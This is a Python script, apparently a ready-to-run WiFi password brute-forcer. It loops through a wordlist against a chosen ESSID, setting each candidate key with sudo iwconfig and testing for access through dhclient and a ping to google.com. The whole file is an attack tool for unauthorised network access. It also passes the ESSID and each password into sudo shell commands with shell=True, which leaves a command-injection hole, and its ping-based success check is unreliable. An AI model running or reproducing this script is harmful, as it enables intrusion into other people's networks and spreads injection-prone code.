import subprocess
import sys

def bruteforce(essid, wordlist):
    cmd = "sudo iwconfig wlan0 essid " + essid
    subprocess.call(cmd, shell=True)
    with open(wordlist, "r") as passwords:
        for password in passwords:
            password = password.strip("\n")
            cmd = "sudo iwconfig wlan0 key s:" + password
            print("Trying password: " + password)
            subprocess.call(cmd, shell=True)
            cmd = "sudo dhclient wlan0"
            subprocess.call(cmd, shell=True)
            cmd = "ping -c 1 google.com"
            response = subprocess.call(cmd, shell=True)
            if response == 0:
                print("\nPassword found: " + password)
                sys.exit(0)
            else:
                print("Password incorrect, trying next password")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python bruteforce wifibrute.py <essid> <wordlist>")
    else:
        essid = sys.argv[1]
        wordlist = sys.argv[2]
        bruteforce(essid, wordlist)